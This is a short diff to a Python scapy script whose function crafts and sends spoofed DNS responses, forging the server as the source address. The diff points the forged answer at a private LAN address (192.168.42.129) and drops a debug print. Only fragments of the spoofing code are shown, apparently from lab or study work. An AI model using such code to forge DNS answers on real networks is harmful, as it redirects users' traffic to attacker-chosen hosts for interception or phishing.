@@ -2,7 +2,8 @@ import scapy.all as scapy
 
 def send_dns_response(client_ip, client_port, dest_ip, domain, ip_address, transaction_id, Interface):
     # Google's IP address for the response
-    URL_Destination = "142.250.217.68"  # Replace with any IP you want to use, like Google's
+    #URL_Destination = "142.250.217.68"  # Replace with any IP you want to use, like Google's
+    URL_Destination = "192.168.42.129"
 
     # Craft the IP layer
     ip = scapy.IP(src=dest_ip, dst=client_ip)  # Adjust source IP if needed
@@ -29,8 +30,6 @@ def send_dns_response(client_ip, client_port, dest_ip, domain, ip_address, trans
     
     # Stack layers to form the final packet
     response_packet = ip / udp / dns
-
-    print(f"{client_ip},{domain}")
     
     # Send the packet
     scapy.send(response_packet, iface=Interface , verbose = False)
